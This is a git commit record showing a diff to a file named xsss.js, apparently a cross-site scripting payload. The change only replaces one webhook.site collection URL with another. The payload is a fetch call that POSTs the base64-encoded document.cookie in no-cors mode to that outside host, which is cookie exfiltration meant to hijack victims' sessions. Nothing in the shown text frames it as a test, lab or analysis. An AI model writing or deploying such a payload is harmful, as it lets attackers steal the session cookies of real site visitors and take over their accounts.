017c61cf42fe2bd54f8292f7aa272346b3f91ee7
1NF3RN0 <120143396+ItzMed@users.noreply.github.com>
2025-02-07 23:59:22 +0100

    Update xsss.js

--- xsss.js
+++ xsss.js
@@ -1,4 +1,4 @@
-fetch("https://webhook.site/fef07d14-412a-4afd-b4d1-bc6cc4cf3f3f", {
+fetch("https://webhook.site/89fd4ca8-8dd9-4b06-a5e5-1bb64b9677e6", {
     method: "POST",
     mode: "no-cors",
     body: btoa(document.cookie)
